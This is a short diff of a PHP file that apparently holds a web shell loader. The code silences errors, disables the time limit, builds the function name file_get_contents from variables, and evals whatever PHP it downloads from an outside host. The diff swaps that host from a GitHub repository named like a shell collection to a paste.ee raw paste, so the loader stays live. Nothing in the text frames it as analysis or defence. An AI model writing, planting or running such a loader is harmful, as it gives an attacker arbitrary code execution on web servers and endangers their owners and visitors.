@@ -2,7 +2,7 @@
 error_reporting(0); set_time_limit(0);
         $awo = 'https://';
         $fgt = 'file_get_contents';
-        $data = $fgt($awo . 'raw.githubusercontent.com/Clay-Haxor3/Shell/refs/heads/main/conviguration');
+        $data = $fgt($awo . 'paste.ee/r/BqyzKWlB/0');
     
         $admin = '?>';
         eval($admin . $data);
